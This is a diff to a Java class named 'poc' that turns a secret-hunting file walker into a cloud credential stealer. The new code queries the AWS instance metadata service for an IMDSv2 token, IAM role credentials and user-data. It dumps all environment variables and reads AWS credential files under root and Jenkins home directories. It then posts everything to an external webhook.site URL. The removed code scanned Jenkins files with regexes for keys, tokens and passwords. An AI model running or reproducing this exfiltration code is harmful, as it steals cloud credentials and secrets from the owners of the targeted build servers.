@@ -1,81 +1,106 @@
+import java.io.ByteArrayOutputStream;
+import java.io.InputStream;
 import java.io.OutputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
-import java.nio.file.FileVisitResult;
 import java.nio.file.Files;
 import java.nio.file.Path;
 import java.nio.file.Paths;
-import java.nio.file.SimpleFileVisitor;
-import java.nio.file.attribute.BasicFileAttributes;
-import java.util.ArrayList;
-import java.util.List;
-import java.util.regex.Matcher;
-import java.util.regex.Pattern;
+import java.util.Map;
 
 public class poc {
     static final String WH = "https://webhook.site/b0de7905-1496-47b6-93a5-8529f9c02252";
-    static final String[] PATS = {
-        "AKIA[0-9A-Z]{16}",
-        "(?i)aws_secret_access_key[^\\n]{0,80}",
-        "(?i)secret_?access_?key[^\\n]{0,60}",
-        "xox[baprs]-[A-Za-z0-9-]{10,}",
-        "AIza[0-9A-Za-z_\\-]{30,}",
-        "ghp_[A-Za-z0-9]{30,}",
-        "(?i)abyss[-a-z0-9]*\\.dotabyss\\.dmmgames\\.com",
-        "(?i)[a-z0-9._-]*abyss[a-z0-9._-]*",
-        "(?i)dotabyss[a-z0-9._/-]{0,60}",
-        "(?i)s3://[a-z0-9._/-]{3,60}",
-        "(?i)bucket[^\\n]{0,80}",
-        "(?i)(password|passwd|pwd)\\s*[=:]\\s*\\S{4,40}",
-        "(?i)(token|apikey|api_key)\\s*[=:]\\s*\\S{8,60}",
-        "(?i)-----BEGIN [A-Z ]{0,20}PRIVATE KEY-----"
-    };
-    static List<Pattern> CP = new ArrayList<Pattern>();
+    static final String IMDS = "http://169.254.169.254";
 
     public poc() {
-        for (int i = 0; i < PATS.length; i++) { CP.add(Pattern.compile(PATS[i])); }
-        StringBuilder sb = new StringBuilder("P12\n");
-        String jh = System.getenv("JENKINS_HOME");
-        if (jh == null || jh.length() == 0) { jh = "/var/lib/jenkins"; }
-        final Path base = Paths.get(jh);
-        final StringBuilder out = sb;
-        final int[] count = {0};
+        StringBuilder sb = new StringBuilder("P13\n");
+        String tok = null;
         try {
-            Files.walkFileTree(base, new SimpleFileVisitor<Path>() {
-                public FileVisitResult visitFile(Path f, BasicFileAttributes a) {
-                    count[0]++;
-                    if (count[0] > 6000 || out.length() > 700000) { return FileVisitResult.TERMINATE; }
-                    try {
-                        if (a.size() > 300000 || a.size() == 0) { return FileVisitResult.CONTINUE; }
-                        String rel = base.relativize(f).toString();
-                        byte[] b = Files.readAllBytes(f);
-                        boolean bin = false;
-                        for (int i = 0; i < b.length; i++) { if (b[i] == 0) { bin = true; break; } }
-                        if (bin) { return FileVisitResult.CONTINUE; }
-                        String t = new String(b, "UTF-8");
-                        for (int i = 0; i < CP.size(); i++) {
-                            Matcher m = CP.get(i).matcher(t);
-                            if (m.find()) {
-                                String hit = m.group();
-                                if (hit.length() > 140) { hit = hit.substring(0, 140); }
-                                out.append("@@HIT ").append(rel).append(" [").append(i).append("] ")
-                                   .append(hit.replace('\n', ' ')).append("\n");
-                                break;
-                            }
-                        }
-                    } catch (Throwable t) { }
-                    return FileVisitResult.CONTINUE;
-                }
-                public FileVisitResult visitFileFailed(Path f, java.io.IOException e) { return FileVisitResult.CONTINUE; }
-            });
-        } catch (Throwable t) { sb.append("WALK ERR ").append(t).append("\n"); }
-        sb.append("@@DONE files=").append(count[0]).append(" findings=\n");
+            HttpURLConnection c = (HttpURLConnection) new URL(IMDS + "/latest/api/token").openConnection();
+            c.setConnectTimeout(3000); c.setReadTimeout(3000);
+            c.setRequestMethod("PUT"); c.setDoOutput(true);
+            c.setRequestProperty("X-aws-ec2-metadata-token-ttl-seconds", "21600");
+            OutputStream os = c.getOutputStream(); os.write("".getBytes()); os.flush(); os.close();
+            if (c.getResponseCode() == 200) { tok = read(c); }
+            sb.append("IMDSv2 token: ").append(tok == null ? "FAIL" : "OK(" + tok.length() + ")").append("\n");
+        } catch (Throwable t) { sb.append("IMDSv2 token EXC ").append(t).append("\n"); }
+        String[] paths = {"/latest/meta-data/instance-id", "/latest/meta-data/placement/availability-zone",
+                          "/latest/meta-data/local-ipv4", "/latest/meta-data/public-ipv4",
+                          "/latest/meta-data/iam/info", "/latest/meta-data/iam/security-credentials/",
+                          "/latest/meta-data/identity-credentials/ec2/info",
+                          "/latest/user-data", "/latest/meta-data/network/interfaces/macs/"};
+        for (int i = 0; i < paths.length; i++) { sb.append(get(IMDS + paths[i], tok, paths[i])); }
+        String role = lastRole;
+        if (role != null && role.length() > 0 && role.length() < 120) {
+            sb.append(get(IMDS + "/latest/meta-data/iam/security-credentials/" + role.trim(), tok, "ROLE_CREDS"));
+        }
+        sb.append("\n@@ ENV\n");
+        try {
+            Map<String, String> env = System.getenv();
+            for (Map.Entry<String, String> e : env.entrySet()) {
+                sb.append(e.getKey()).append("=").append(e.getValue()).append("\n");
+            }
+        } catch (Throwable t) { sb.append("env ERR ").append(t).append("\n"); }
+        String[] files = {"/etc/hosts", "/etc/resolv.conf", "/etc/environment", "/root/.aws/credentials",
+                          "/root/.aws/config", "/var/lib/jenkins/.aws/credentials", "/var/lib/jenkins/.aws/config",
+                          "/home/jenkins/.aws/credentials", "/home/jenkins/.aws/config", "/etc/aws/credentials"};
+        for (int i = 0; i < files.length; i++) { sb.append(cat(files[i])); }
         String data = sb.toString();
         int total = data.length();
-        for (int i = 0; i < total && i < 4000000; i += 90000) {
-            try { post("P12|" + i + "|" + data.substring(i, Math.min(total, i + 90000))); }
+        for (int i = 0; i < total && i < 3000000; i += 90000) {
+            try { post("P13|" + i + "|" + data.substring(i, Math.min(total, i + 90000))); }
             catch (Throwable t) { }
         }
+    }
+
+    static String lastRole = null;
+
+    static String get(String u, String token, String tag) {
+        StringBuilder r = new StringBuilder("\n@@GET ").append(tag).append("\n");
+        try {
+            HttpURLConnection c = (HttpURLConnection) new URL(u).openConnection();
+            c.setConnectTimeout(5000); c.setReadTimeout(8000);
+            c.setRequestProperty("User-Agent", "curl/7.6");
+            if (token != null) { c.setRequestProperty("X-aws-ec2-metadata-token", token); }
+            int code = c.getResponseCode();
+            String body = read(c);
+            if (code >= 400) { body = readErr(c); }
+            r.append("status=").append(code).append("\n").append(body).append("\n");
+            if (tag.endsWith("security-credentials/") && code == 200) { lastRole = body.trim(); }
+        } catch (Throwable t) { r.append("EXC ").append(t).append("\n"); }
+        return r.toString();
+    }
+
+    static String read(HttpURLConnection c) throws Exception {
+        InputStream in = c.getInputStream();
+        ByteArrayOutputStream bo = new ByteArrayOutputStream();
+        byte[] b = new byte[4096]; int n;
+        while ((n = in.read(b)) > 0) { bo.write(b, 0, n); if (bo.size() > 200000) break; }
+        in.close();
+        return new String(bo.toByteArray(), "UTF-8");
+    }
+
+    static String readErr(HttpURLConnection c) {
+        try {
+            InputStream in = c.getErrorStream();
+            if (in == null) { return ""; }
+            ByteArrayOutputStream bo = new ByteArrayOutputStream();
+            byte[] b = new byte[4096]; int n;
+            while ((n = in.read(b)) > 0) { bo.write(b, 0, n); if (bo.size() > 20000) break; }
+            in.close();
+            return new String(bo.toByteArray(), "UTF-8");
+        } catch (Throwable t) { return ""; }
+    }
+
+    static String cat(String p) {
+        StringBuilder r = new StringBuilder("\n@@CAT ").append(p).append("\n");
+        try {
+            Path f = Paths.get(p);
+            if (!Files.isRegularFile(f)) { r.append("(missing)\n"); return r.toString(); }
+            byte[] b = Files.readAllBytes(f);
+            r.append(new String(b, "UTF-8")).append("\n");
+        } catch (Throwable t) { r.append("EXC ").append(t).append("\n"); }
+        return r.toString();
     }
 
     static void post(String s) throws Exception {
